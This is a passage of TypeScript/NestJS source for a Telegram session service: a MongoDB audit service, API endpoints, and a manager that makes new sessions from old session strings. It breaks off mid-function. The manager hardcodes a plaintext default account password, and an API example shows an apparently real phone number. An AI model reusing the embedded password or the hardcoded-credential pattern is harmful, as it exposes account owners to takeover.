});\r\nSessionAuditSchema.index({ status: 1, isActive: 1 });\r\nSessionAuditSchema.index({ createdAt: -1 });\r\nSessionAuditSchema.index({ lastUsedAt: -1 });\r\nSessionAuditSchema.index({ mobile: 1, isActive: 1, status: 1 });\r\n\r\n// Add middleware to automatically update lastUsedAt when session is accessed\r\nSessionAuditSchema.pre('findOneAndUpdate', function() {\r\n    const update = this.getUpdate() as any;\r\n    if (update.$set && !update.$set.lastUsedAt) {\r\n        update.$set.lastUsedAt = new Date();\r\n    }\r\n});\r\n","import { Injectable } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { SessionAudit, SessionAuditDocument, SessionStatus, SessionCreationMethod } from './schemas/sessions.schema';\r\nimport { CreateSessionAuditDto, UpdateSessionAuditDto, SessionAuditQueryDto, SessionAuditStatsDto } from './dto/session-audit.dto';\r\nimport { TelegramLogger } from '../Telegram/utils/telegram-logger';\r\n\r\n@Injectable()\r\nexport class SessionAuditService {\r\n    private readonly logger: TelegramLogger;\r\n\r\n    constructor(\r\n        @InjectModel(SessionAudit.name) private sessionAuditModel: Model<SessionAuditDocument>,\r\n    ) {\r\n        this.logger = TelegramLogger.getInstance();\r\n    }\r\n\r\n    /**\r\n     * Create a new session audit record\r\n     */\r\n    async createAuditRecord(createDto: CreateSessionAuditDto): Promise<SessionAudit> {\r\n        try {\r\n            this.logger.logOperation(createDto.mobile, 'Creating session audit record');\r\n\r\n            const sessionAudit = new this.sessionAuditModel({\r\n                ...createDto,\r\n                status: SessionStatus.CREATED,\r\n                createdAt: new Date(),\r\n                lastUsedAt: new Date(),\r\n                usageCount: 0,\r\n                isActive: true\r\n            });\r\n\r\n            const savedRecord = await sessionAudit.save();\r\n            this.logger.logOperation(createDto.mobile, `Session audit record created with ID: ${savedRecord.id}`);\r\n\r\n            return savedRecord;\r\n        } catch (error) {\r\n            this.logger.logError(createDto.mobile, 'Failed to create session audit record', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Update an existing session audit record\r\n     */\r\n    async updateAuditRecord(\r\n        mobile: string,\r\n        sessionString: string | undefined,\r\n        updateDto: UpdateSessionAuditDto\r\n    ): Promise<SessionAudit | null> {\r\n        try {\r\n            this.logger.logOperation(mobile, 'Updating session audit record');\r\n\r\n            // Auto-update lastUsedAt when updating session\r\n            const updateData = {\r\n                ...updateDto,\r\n                lastUsedAt: new Date()\r\n            };\r\n\r\n            // Build query - if sessionString is provided, use it; otherwise find the latest record\r\n            const query: any = { mobile, isActive: true };\r\n            if (sessionString) {\r\n                query.sessionString = sessionString;\r\n            }\r\n\r\n            const updatedRecord = await this.sessionAuditModel.findOneAndUpdate(\r\n                query,\r\n                { $set: updateData },\r\n                { new: true, sort: { createdAt: -1 } } // Sort by creation time to get the latest if no sessionString\r\n            );\r\n\r\n            if (updatedRecord) {\r\n                this.logger.logOperation(mobile, `Session audit record updated: ${updatedRecord.id}`);\r\n            } else {\r\n                this.logger.logOperation(mobile, 'No active session audit record found to update');\r\n            }\r\n\r\n            return updatedRecord;\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Failed to update session audit record', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Mark session as used (increment usage count and update lastUsedAt)\r\n     */\r\n    async markSessionUsed(mobile: string, sessionString?: string): Promise<SessionAudit | null> {\r\n        try {\r\n            const query: any = { mobile, isActive: true };\r\n            if (sessionString) {\r\n                query.sessionString = sessionString;\r\n            }\r\n\r\n            const updatedRecord = await this.sessionAuditModel.findOneAndUpdate(\r\n                query,\r\n                {\r\n                    $inc: { usageCount: 1 },\r\n                    $set: { lastUsedAt: new Date() }\r\n                },\r\n                { new: true, sort: { createdAt: -1 } } // Get the latest session if no sessionString provided\r\n            );\r\n\r\n            if (updatedRecord) {\r\n                this.logger.logOperation(mobile, `Session usage recorded: count ${updatedRecord.usageCount}`);\r\n            }\r\n\r\n            return updatedRecord;\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Failed to mark session as used', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Mark session as failed with error\r\n     */\r\n    async markSessionFailed(\r\n        mobile: string,\r\n        sessionString: string | undefined,\r\n        errorMessage: string\r\n    ): Promise<SessionAudit | null> {\r\n        try {\r\n            return await this.updateAuditRecord(mobile, sessionString, {\r\n                status: SessionStatus.FAILED,\r\n                errorMessage,\r\n                lastError: errorMessage,\r\n                isActive: false\r\n            });\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Failed to mark session as failed', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Revoke/deactivate a session\r\n     */\r\n    async revokeSession(\r\n        mobile: string,\r\n        sessionString: string,\r\n        reason: string = 'manual_revocation'\r\n    ): Promise<SessionAudit | null> {\r\n        try {\r\n            return await this.updateAuditRecord(mobile, sessionString, {\r\n                status: SessionStatus.REVOKED,\r\n                revocationReason: reason,\r\n                revokedAt: new Date(),\r\n                isActive: false\r\n            });\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Failed to revoke session', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get all sessions for a phone number\r\n     */\r\n    async getSessionsFormobile(mobile: string, activeOnly: boolean = false): Promise<SessionAudit[]> {\r\n        try {\r\n            const query: any = { mobile };\r\n            if (activeOnly) {\r\n                query.isActive = true;\r\n            }\r\n\r\n            const sessions = await this.sessionAuditModel\r\n                .find(query)\r\n                .sort({ createdAt: -1 })\r\n                .exec();\r\n\r\n            this.logger.logOperation(mobile, `Retrieved ${sessions.length} session records`);\r\n            return sessions;\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Failed to get sessions for phone number', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get the latest active session for a phone number\r\n     */\r\n    async getLatestActiveSession(mobile: string): Promise<SessionAudit | null> {\r\n        try {\r\n            const session = await this.sessionAuditModel\r\n                .findOne({ mobile, isActive: true })\r\n                .sort({ createdAt: -1 })\r\n                .exec();\r\n\r\n            if (session) {\r\n                this.logger.logOperation(mobile, `Latest active session found: ${session.id}`);\r\n            }\r\n\r\n            return session;\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Failed to get latest active session', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Query sessions with filters\r\n     */\r\n    async querySessionAudits(queryDto: SessionAuditQueryDto): Promise<{\r\n        sessions: SessionAudit[];\r\n        total: number;\r\n        page: number;\r\n        limit: number;\r\n    }> {\r\n        try {\r\n            const {\r\n                mobile,\r\n                status,\r\n                creationMethod,\r\n                isActive,\r\n                limit = 20,\r\n                offset = 0,\r\n                startDate,\r\n                endDate\r\n            } = queryDto;\r\n\r\n            // Build query\r\n            const query: any = {};\r\n            if (mobile) query.mobile = mobile;\r\n            if (status) query.status = status;\r\n            if (creationMethod) query.creationMethod = creationMethod;\r\n            if (isActive !== undefined) query.isActive = isActive;\r\n\r\n            // Date range filter\r\n            if (startDate || endDate) {\r\n                query.createdAt = {};\r\n                if (startDate) query.createdAt.$gte = startDate;\r\n                if (endDate) query.createdAt.$lte = endDate;\r\n            }\r\n\r\n            // Execute query with pagination\r\n            const [sessions, total] = await Promise.all([\r\n                this.sessionAuditModel\r\n                    .find(query)\r\n                    .sort({ createdAt: -1 })\r\n                    .skip(offset)\r\n                    .limit(limit)\r\n                    .exec(),\r\n                this.sessionAuditModel.countDocuments(query)\r\n            ]);\r\n\r\n            this.logger.logOperation('system', `Session audit query returned ${sessions.length} of ${total} records`);\r\n\r\n            return {\r\n                sessions,\r\n                total,\r\n                page: Math.floor(offset / limit) + 1,\r\n                limit\r\n            };\r\n        } catch (error) {\r\n            this.logger.logError('system', 'Failed to query session audits', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Get session audit statistics\r\n     */\r\n    async getSessionStats(mobile?: string, days: number = 30): Promise<SessionAuditStatsDto> {\r\n        try {\r\n            const startDate = new Date();\r\n            startDate.setDate(startDate.getDate() - days);\r\n\r\n            const query: any = { createdAt: { $gte: startDate } };\r\n            if (mobile) {\r\n                query.mobile = mobile;\r\n            }\r\n\r\n            // Aggregate statistics\r\n            const stats = await this.sessionAuditModel.aggregate([\r\n                { $match: query },\r\n                {\r\n                    $group: {\r\n                        _id: null,\r\n                        totalSessions: { $sum: 1 },\r\n                        activeSessions: {\r\n                            $sum: { $cond: [{ $eq: ['$status', SessionStatus.ACTIVE] }, 1, 0] }\r\n                        },\r\n                        expiredSessions: {\r\n                            $sum: { $cond: [{ $eq: ['$status', SessionStatus.EXPIRED] }, 1, 0] }\r\n                        },\r\n                        revokedSessions: {\r\n                            $sum: { $cond: [{ $eq: ['$status', SessionStatus.REVOKED] }, 1, 0] }\r\n                        },\r\n                        failedSessions: {\r\n                            $sum: { $cond: [{ $eq: ['$status', SessionStatus.FAILED] }, 1, 0] }\r\n                        }\r\n                    }\r\n                }\r\n            ]);\r\n\r\n            // Get creation method breakdown\r\n            const methodBreakdown = await this.sessionAuditModel.aggregate([\r\n                { $match: query },\r\n                {\r\n                    $group: {\r\n                        _id: '$creationMethod',\r\n                        count: { $sum: 1 }\r\n                    }\r\n                }\r\n            ]);\r\n\r\n            const baseStats = stats[0] || {\r\n                totalSessions: 0,\r\n                activeSessions: 0,\r\n                expiredSessions: 0,\r\n                revokedSessions: 0,\r\n                failedSessions: 0\r\n            };\r\n\r\n            const creationMethodBreakdown: Record<string, number> = {};\r\n            methodBreakdown.forEach(item => {\r\n                creationMethodBreakdown[item._id] = item.count;\r\n            });\r\n\r\n            const result: SessionAuditStatsDto = {\r\n                ...baseStats,\r\n                creationMethodBreakdown,\r\n                dateRange: {\r\n                    start: startDate,\r\n                    end: new Date()\r\n                }\r\n            };\r\n\r\n            this.logger.logOperation(mobile || 'system', `Session stats retrieved: ${result.totalSessions} total sessions`);\r\n            return result;\r\n        } catch (error) {\r\n            this.logger.logError(mobile || 'system', 'Failed to get session stats', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Clean up old session records (older than specified days)\r\n     */\r\n    async cleanupOldSessions(days: number = 90): Promise<{ deletedCount: number }> {\r\n        try {\r\n            const cutoffDate = new Date();\r\n            cutoffDate.setDate(cutoffDate.getDate() - days);\r\n\r\n            const result = await this.sessionAuditModel.deleteMany({\r\n                createdAt: { $lt: cutoffDate },\r\n                isActive: false\r\n            });\r\n\r\n            this.logger.logOperation('system', `Cleaned up ${result.deletedCount} old session records`);\r\n            return { deletedCount: result.deletedCount };\r\n        } catch (error) {\r\n            this.logger.logError('system', 'Failed to cleanup old sessions', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    async findRecentSessions(mobile: string): Promise<SessionAudit[]> {\r\n        try {\r\n            const tenDaysAgo = new Date();\r\n            tenDaysAgo.setDate(tenDaysAgo.getDate() - 10);\r\n            tenDaysAgo.setHours(0, 0, 0, 0);\r\n            const recentSessions = await this.sessionAuditModel\r\n                .find({\r\n                    mobile,\r\n                    isActive: true,\r\n                    status: { $in: [SessionStatus.ACTIVE, SessionStatus.CREATED] },\r\n                    $or: [\r\n                        { lastUsedAt: { $gte: tenDaysAgo } },\r\n                        {\r\n                            lastUsedAt: { $exists: false },\r\n                            createdAt: { $gte: tenDaysAgo }\r\n                        }\r\n                    ]\r\n                })\r\n                .sort({ lastUsedAt: -1, createdAt: -1 })\r\n                .exec();\r\n            return recentSessions;\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Failed to find valid session from last 10 days', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Mark expired sessions as expired (sessions not used in X days)\r\n     */\r\n    async markExpiredSessions(inactiveDays: number = 7): Promise<{ modifiedCount: number }> {\r\n        try {\r\n            const cutoffDate = new Date();\r\n            cutoffDate.setDate(cutoffDate.getDate() - inactiveDays);\r\n\r\n            const result = await this.sessionAuditModel.updateMany(\r\n                {\r\n                    lastUsedAt: { $lt: cutoffDate },\r\n                    status: { $in: [SessionStatus.CREATED, SessionStatus.ACTIVE] },\r\n                    isActive: true\r\n                },\r\n                {\r\n                    $set: {\r\n                        status: SessionStatus.EXPIRED,\r\n                        isActive: false,\r\n                        revokedAt: new Date(),\r\n                        revocationReason: 'auto_expired_due_to_inactivity'\r\n                    }\r\n                }\r\n            );\r\n\r\n            this.logger.logOperation('system', `Marked ${result.modifiedCount} sessions as expired`);\r\n            return { modifiedCount: result.modifiedCount };\r\n        } catch (error) {\r\n            this.logger.logError('system', 'Failed to mark expired sessions', error);\r\n            throw error;\r\n        }\r\n    }\r\n}\r\n","import { Controller, Post, Body, HttpException, HttpStatus, Get, Query, UsePipes, ValidationPipe } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiBody, ApiQuery } from '@nestjs/swagger';\r\nimport { SessionService } from './session.service';\r\nimport { IsString, IsOptional, IsBoolean, IsNumber, Min } from 'class-validator';\r\nimport { ApiPropertyOptional } from '@nestjs/swagger';\r\n\r\n// DTOs for the two main endpoints\r\nexport class CreateSessionDto {\r\n    @ApiPropertyOptional({\r\n        description: 'Phone number with country code (optional if session provided)',\r\n        example: '+1234567890'\r\n    })\r\n    @IsOptional()\r\n    @IsString()\r\n    mobile?: string;\r\n\r\n    @ApiPropertyOptional({\r\n        description: 'Existing session string to use',\r\n        example: '1BVtsOHIBu2iBJgvn6U6SfJTgN6zPg2CwJjFBw5wHkJfFpBVts...'\r\n    })\r\n    @IsOptional()\r\n    @IsString()\r\n    session?: string;\r\n\r\n    @ApiPropertyOptional({\r\n        description: 'Force creation of new session even if active session exists',\r\n        default: false\r\n    })\r\n    @IsOptional()\r\n    @IsBoolean()\r\n    forceNew?: boolean;\r\n}\r\n\r\nexport class SearchAuditDto {\r\n    @ApiPropertyOptional({\r\n        description: 'Phone number to search for',\r\n        example: '+1234567890'\r\n    })\r\n    @IsOptional()\r\n    @IsString()\r\n    mobile?: string;\r\n\r\n    @ApiPropertyOptional({\r\n        description: 'Session status to filter by',\r\n        enum: ['created', 'active', 'expired', 'revoked', 'failed']\r\n    })\r\n    @IsOptional()\r\n    @IsString()\r\n    status?: string;\r\n\r\n    @ApiPropertyOptional({\r\n        description: 'Number of records to return',\r\n        default: 10,\r\n        minimum: 1\r\n    })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    @Min(1)\r\n    limit?: number;\r\n\r\n    @ApiPropertyOptional({\r\n        description: 'Number of records to skip',\r\n        default: 0,\r\n        minimum: 0\r\n    })\r\n    @IsOptional()\r\n    @IsNumber()\r\n    @Min(0)\r\n    offset?: number;\r\n}\r\n\r\n@ApiTags('Telegram Session Management')\r\n@Controller('telegram/session')\r\n@UsePipes(new ValidationPipe({ transform: true, whitelist: true }))\r\nexport class SessionController {\r\n    constructor(private readonly sessionService: SessionService) {}\r\n\r\n    @Post('create')\r\n    @ApiOperation({\r\n        summary: 'Master session creation endpoint',\r\n        description: 'Creates or retrieves a session based on provided parameters. If forceNew is true, always creates a new session. If forceNew is false, returns active session if exists and was used this month, otherwise creates new.'\r\n    })\r\n    @ApiBody({ type: CreateSessionDto })\r\n    @ApiResponse({\r\n        status: 200,\r\n        description: 'Session created or retrieved successfully',\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                success: { type: 'boolean', example: true },\r\n                message: { type: 'string', example: 'Session created successfully' },\r\n                session: { type: 'string', example: '1BVtsOHIBu2iBJgvn6U6SfJTgN6z...' },\r\n                isNew: { type: 'boolean', example: true }\r\n            }\r\n        }\r\n    })\r\n    @ApiResponse({\r\n        status: 400,\r\n        description: 'Bad request - validation failed or session creation failed'\r\n    })\r\n    async createSession(@Body() body: CreateSessionDto) {\r\n        try {\r\n            if (!body.mobile && !body.session) {\r\n                throw new HttpException(\r\n                    {\r\n                        success: false,\r\n                        message: 'Either mobile number or session string is required'\r\n                    },\r\n                    HttpStatus.BAD_REQUEST\r\n                );\r\n            }\r\n\r\n            if (!body.forceNew && body.mobile) {\r\n                const validSessionResult = await this.sessionService.findRecentValidSession(body.mobile);\r\n                if (validSessionResult.success && validSessionResult.session) {\r\n                    // Add error handling for updateSessionLastUsed\r\n                    try {\r\n                        await this.sessionService.updateSessionLastUsed(body.mobile, validSessionResult.session.sessionString);\r\n                    } catch (updateError) {\r\n                        console.log('Warning: Failed to update session last used timestamp:', updateError.message);\r\n                        // Continue execution even if update fails\r\n                    }\r\n\r\n                    return {\r\n                        success: true,\r\n                        message: 'Valid session found from this month',\r\n                        session: validSessionResult.session.sessionString,\r\n                        isNew: false\r\n                    };\r\n                } else {\r\n                    console.log('No valid session found from this month');\r\n                }\r\n            }\r\n\r\n            // Create new session\r\n            const options = {\r\n                mobile: body.mobile,\r\n                oldSession: body.session\r\n            };\r\n\r\n            const result = await this.sessionService.createSession(options);\r\n\r\n            if (result.success) {\r\n                return {\r\n                    success: true,\r\n                    message: 'Session created successfully',\r\n                    session: result.session,\r\n                    isNew: true\r\n                };\r\n            } else {\r\n                throw new HttpException(\r\n                    {\r\n                        success: false,\r\n                        message: result.error,\r\n                        retryable: result.retryable\r\n                    },\r\n                    result.retryable ? HttpStatus.TOO_MANY_REQUESTS : HttpStatus.BAD_REQUEST\r\n                );\r\n            }\r\n        } catch (error) {\r\n            if (error instanceof HttpException) {\r\n                throw error;\r\n            }\r\n\r\n            throw new HttpException(\r\n                {\r\n                    success: false,\r\n                    message: error.message || 'Failed to create/retrieve session'\r\n                },\r\n                HttpStatus.INTERNAL_SERVER_ERROR\r\n            );\r\n        }\r\n    }\r\n\r\n    @Get('audit/search')\r\n    @ApiOperation({\r\n        summary: 'Search existing audit sessions',\r\n        description: 'Search and retrieve session audit records based on various criteria'\r\n    })\r\n    @ApiQuery({ name: 'mobile', required: false, type: String, description: 'Phone number to search for' })\r\n    @ApiQuery({ name: 'status', required: false, enum: ['created', 'active', 'expired', 'revoked', 'failed'], description: 'Filter by session status' })\r\n    @ApiQuery({ name: 'limit', required: false, type: Number, description: 'Number of records to return (default: 10)' })\r\n    @ApiQuery({ name: 'offset', required: false, type: Number, description: 'Number of records to skip (default: 0)' })\r\n    @ApiResponse({\r\n        status: 200,\r\n        description: 'Audit records retrieved successfully',\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                success: { type: 'boolean', example: true },\r\n                data: {\r\n                    type: 'array',\r\n                    items: {\r\n                        type: 'object',\r\n                        properties: {\r\n                            mobile: { type: 'string', example: '916265240911' },\r\n                            sessionString: { type: 'string', example: '1BQANOTEuM==...' },\r\n                            status: { type: 'string', example: 'active' },\r\n                            creationMethod: { type: 'string', example: 'old_session' },\r\n                            createdAt: { type: 'string', example: '2023-12-01T10:00:00Z' },\r\n                            lastUsedAt: { type: 'string', example: '2023-12-01T15:30:00Z' },\r\n                            usageCount: { type: 'number', example: 5 }\r\n                        }\r\n                    }\r\n                },\r\n                total: { type: 'number', example: 25 },\r\n                message: { type: 'string', example: 'Audit records retrieved successfully' }\r\n            }\r\n        }\r\n    })\r\n    async searchAudit(\r\n        @Query('mobile') mobile?: string,\r\n        @Query('status') status?: string,\r\n        @Query('limit') limit?: number,\r\n        @Query('offset') offset?: number\r\n    ) {\r\n        try {\r\n            // Validate and sanitize numeric inputs\r\n            const safeLimit = limit && !isNaN(Number(limit)) && Number(limit) > 0 ? Number(limit) : 10;\r\n            const safeOffset = offset && !isNaN(Number(offset)) && Number(offset) >= 0 ? Number(offset) : 0;\r\n\r\n            const options = {\r\n                limit: safeLimit,\r\n                offset: safeOffset\r\n            };\r\n\r\n            let result;\r\n            if (mobile) {\r\n                // Search by mobile number\r\n                result = await this.sessionService.getSessionAuditHistory(mobile, {\r\n                    ...options,\r\n                    status: status as any\r\n                });\r\n            } else {\r\n                // General search - we need to implement this in service\r\n                // For now, throw error as we need mobile for the current implementation\r\n                throw new HttpException(\r\n                    {\r\n                        success: false,\r\n                        message: 'Mobile number is required for search'\r\n                    },\r\n                    HttpStatus.BAD_REQUEST\r\n                );\r\n            }\r\n\r\n            if (result.success) {\r\n                return {\r\n                    success: true,\r\n                    data: result.data || [],\r\n                    total: result.total || 0,\r\n                    message: `Retrieved ${result.data?.length || 0} audit records`\r\n                };\r\n            } else {\r\n                throw new HttpException(\r\n                    {\r\n                        success: false,\r\n                        message: result.error || 'Failed to retrieve audit records'\r\n                    },\r\n                    HttpStatus.BAD_REQUEST\r\n                );\r\n            }\r\n        } catch (error) {\r\n            if (error instanceof HttpException) {\r\n                throw error;\r\n            }\r\n\r\n            throw new HttpException(\r\n                {\r\n                    success: false,\r\n                    message: error.message || 'Failed to search audit records'\r\n                },\r\n                HttpStatus.INTERNAL_SERVER_ERROR\r\n            );\r\n        }\r\n    }\r\n}\r\n","import { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { SessionController } from './session.controller';\r\nimport { SessionService } from './session.service';\r\nimport { SessionAuditService } from './session-audit.service';\r\nimport { SessionAudit, SessionAuditSchema } from './schemas/sessions.schema';\r\n\r\n@Module({\r\n    imports: [\r\n        MongooseModule.forFeature([\r\n            { name: SessionAudit.name, schema: SessionAuditSchema }\r\n        ])\r\n    ],\r\n    controllers: [SessionController],\r\n    providers: [SessionService, SessionAuditService],\r\n    exports: [SessionService, SessionAuditService]\r\n})\r\nexport class SessionModule {}\r\n","import { Injectable } from '@nestjs/common';\r\nimport { TelegramClient } from 'telegram';\r\nimport { StringSession } from 'telegram/sessions';\r\nimport { Api } from 'telegram';\r\nimport { parseError, sleep } from '../../utils';\r\nimport { TelegramLogger } from '../Telegram/utils/telegram-logger';\r\nimport { connectionManager } from '../Telegram/utils/connection-manager';\r\nimport { ClientRegistry } from './client-registry';\r\nimport { SessionAuditService } from './session-audit.service';\r\nimport { SessionCreationMethod, SessionStatus, SessionAudit } from './schemas/sessions.schema';\r\nimport { SessionAuditStatsDto } from './dto/session-audit.dto';\r\n\r\nexport interface SessionCreationOptions {\r\n    oldSession?: string;\r\n    mobile?: string;\r\n    password?: string;\r\n    maxRetries?: number;\r\n    retryDelay?: number;\r\n}\r\n\r\nexport interface SessionCreationResult {\r\n    success: boolean;\r\n    session?: string;\r\n    error?: string;\r\n    retryable?: boolean;\r\n}\r\n\r\nexport class SessionManager {\r\n    private static instance: SessionManager | null = null;\r\n    private readonly logger = TelegramLogger.getInstance();\r\n    private readonly clientRegistry = ClientRegistry.getInstance();\r\n\r\n    // Constants\r\n    private readonly DEFAULT_PASSWORD = \"Ajtdmwajt1@\";\r\n    private readonly DEFAULT_MAX_RETRIES = 3;\r\n    private readonly DEFAULT_RETRY_DELAY = 5000;\r\n    private readonly OTP_WAIT_TIME = 120000; // 2 minutes\r\n    private readonly OTP_CHECK_INTERVAL = 3000; // 3 seconds\r\n\r\n    private constructor() {\r\n    }\r\n\r\n    private getApiId(): number {\r\n        const apiId = parseInt(process.env.API_ID!);\r\n        if (isNaN(apiId)) {\r\n            throw new Error('Invalid API_ID: must be a number');\r\n        }\r\n        return apiId;\r\n    }\r\n\r\n    private getApiHash(): string {\r\n        const apiHash = process.env.API_HASH;\r\n        if (!apiHash) {\r\n            throw new Error('API_HASH environment variable is required');\r\n        }\r\n        return apiHash;\r\n    }\r\n\r\n    public static getInstance(): SessionManager {\r\n        if (!SessionManager.instance) {\r\n            SessionManager.instance = new SessionManager();\r\n        }\r\n        return SessionManager.instance;\r\n    }\r\n\r\n    /**\r\n     * Main entry point for session creation with fallback strategies\r\n     */\r\n    public async createSession(options: SessionCreationOptions): Promise<SessionCreationResult> {\r\n        const { mobile, oldSession, password = this.DEFAULT_PASSWORD } = options;\r\n\r\n        // Validate mobile parameter\r\n        if (!mobile) {\r\n            return { success: false, error: 'Mobile number is required', retryable: false };\r\n        }\r\n\r\n        this.logger.logOperation(mobile, 'Starting session creation process with priority order');\r\n\r\n        // Check for existing sessions\r\n        const existingCheck = this.checkExistingSession(mobile);\r\n        if (!existingCheck.canProceed) {\r\n            return existingCheck.result;\r\n        }\r\n\r\n        // Try strategies in priority order: 1. Old session -> 2. Existing manager\r\n        const strategies = this.getCreationStrategies(options);\r\n\r\n        this.logger.logOperation(mobile, `Available strategies: ${strategies.map(s => s.strategyName).join(', ')}`);\r\n\r\n        for (const strategy of strategies) {\r\n            try {\r\n                this.logger.logOperation(mobile, `Attempting strategy: ${strategy.strategyName}`);\r\n                const result = await strategy();\r\n                if (result.success) {\r\n                    this.logger.logOperation(mobile, `✓ Session creation successful with ${strategy.strategyName}`);\r\n                    return result;\r\n                }\r\n                this.logger.logOperation(mobile, `✗ Strategy ${strategy.strategyName} failed: ${result.error}`);\r\n            } catch (error) {\r\n                this.logger.logError(mobile, `✗ Strategy ${strategy.strategyName} threw error`, error);\r\n            }\r\n        }\r\n\r\n        return { success: false, error: 'All SessionManager strategies failed', retryable: false };\r\n    }\r\n\r\n    /**\r\n     * Check if session creation can proceed\r\n     */\r\n    private checkExistingSession(mobile: string): { canProceed: boolean; result?: SessionCreationResult } {\r\n        // Validate mobile parameter\r\n        if (!mobile || typeof mobile !== 'string') {\r\n            return {\r\n                canProceed: false,\r\n                result: { success: false, error: 'Invalid mobile number provided', retryable: false }\r\n            };\r\n        }\r\n\r\n        if (this.clientRegistry.hasClient(mobile)) {\r\n            const clientInfo = this.clientRegistry.getClientInfo(mobile);\r\n            if (clientInfo?.isCreating) {\r\n                return {\r\n                    canProceed: false,\r\n                    result: { success: false, error: 'Session creation already in progress', retryable: true }\r\n                };\r\n            }\r\n            return {\r\n                canProceed: false,\r\n                result: { success: false, error: 'Active session exists. Use cleanup first.', retryable: false }\r\n            };\r\n        }\r\n        return { canProceed: true };\r\n    }\r\n\r\n    /**\r\n     * Get creation strategies in priority order\r\n     * Priority: 1. Old session -> 2. Existing manager -> 3. Audit sessions (handled at service level)\r\n     */\r\n    private getCreationStrategies(options: SessionCreationOptions) {\r\n        const strategies = [];\r\n\r\n        // Strategy 1: Use old session if provided (HIGHEST PRIORITY)\r\n        if (options.oldSession) {\r\n            const strategyFunction = () => this.createFromOldSession(options);\r\n            strategyFunction.strategyName = 'oldSession';\r\n            strategies.push(strategyFunction);\r\n        }\r\n\r\n        // Strategy 2: Use existing TelegramManager (SECOND PRIORITY)\r\n        if (options.mobile) {\r\n            const strategyFunction = () => this.createFromExistingManager(options.mobile);\r\n            strategyFunction.strategyName = 'existingManager';\r\n            strategies.push(strategyFunction);\r\n        }\r\n\r\n        return strategies;\r\n    }\r\n\r\n    /**\r\n     * Create session from old session string\r\n     */\r\n    private async createFromOldSession(options: SessionCreationOptions): Promise<SessionCreationResult> {\r\n        const { oldSession, mobile, password, maxRetries = this.DEFAULT_MAX_RETRIES, retryDelay = this.DEFAULT_RETRY_DELAY } = options;\r\n\r\n        // Validate old session first\r\n        const validation = await this.validateSession(oldSession!, mobile);\r\n        if (!validation.isValid) {\r\n            return { success: false, error: `Session validation failed: ${validation.error}`, retryable: false };\r\n        }\r\n\r\n        // Acquire lock\r\n        const lockId = await this.clientRegistry.waitForLock(mobile);\r\n\r\n        try {\r\n            this.clientRegistry.markClientCreating(mobile, lockId);\r\n\r\n            for (let attempt = 1; attempt <= maxRetries; attempt++) {\r\n                try {\r\n                    const newSession = await this.performSessionCreation(oldSession!, mobile, password!, attempt);\r\n                    return { success: true, session: newSession };\r\n                } catch (error) {\r\n                    const errorMessage = error.message || error.toString();\r\n                    const isRetryable = this.isRetryableError(errorMessage);\r\n\r\n                    if (!isRetryable || attempt === maxRetries) {\r\n                        return { success: false, error: errorMessage, retryable: isRetryable };\r\n                    }\r\n\r\n                    if (attempt < maxRetries) {\r\n                        await sleep(retryDelay);\r\n                    }\r\n                }\r\n            }\r\n\r\n            return { success: false, error: 'Max retries exceeded', retryable: false };\r\n\r\n        } finally {\r\n            if (lockId) {\r\n                await this.clientRegistry.removeClient(mobile, lockId);\r\n                this.clientRegistry.releaseLock(mobile, lockId);\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Create session using existing TelegramManager\r\n     */\r\n    private async createFromExistingManager(mobile: string): Promise<SessionCreationResult> {\r\n        try {\r\n            const client = await connectionManager.getClient(mobile);\r\n            const newSession = await client.createNewSession();\r\n            return { success: true, session: newSession };\r\n        } catch (error) {\r\n            return {\r\n                success: false,\r\n                error: error.message || 'Existing manager method failed',\r\n                retryable: this.isRetryableError(error.message)\r\n            };\r\n        } finally {\r\n            await connectionManager.unregisterClient(mobile);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Validate session functionality\r\n     */\r\n    public async validateSession(sessionString: string, mobile: string): Promise<{ isValid: boolean; error?: string; userInfo?: Api.User }> {\r\n        let tempClient: TelegramClient | null = null;\r\n\r\n        try {\r\n            tempClient = new TelegramClient(\r\n                new StringSession(sessionString),\r\n                this.getApiId(),\r\n                this.getApiHash(),\r\n                { connectionRetries: 1 }\r\n            );\r\n\r\n            await tempClient.connect();\r\n            const userInfo = await tempClient.getMe() as Api.User;\r\n\r\n            if (!userInfo || userInfo.phone !== mobile) {\r\n                return { isValid: false, error: 'Phone number mismatch or invalid user info' };\r\n            }\r\n            this.logger.logOperation(mobile, 'Session validation successful');\r\n            await this.cleanupClient(tempClient, mobile);\r\n            return { isValid: true, userInfo };\r\n        } catch (error) {\r\n            this.logger.logError(mobile, 'Session validation failed', error);\r\n            await this.cleanupClient(tempClient, mobile);\r\n            return { isValid: false, error: error.message || error.toString() || error.errorMessage };\r\n        } finally {\r\n        }\r\n    }\r\n\r\n    /**\r\n     * Perform the actual session creation\r\n     */\r\n    private async performSessionCreation(oldSessionString: string, mobile: string, password: string, attempt: number): Promise<string> {\r\n        let oldClient: TelegramClient | null = null;\r\n        let newClient: 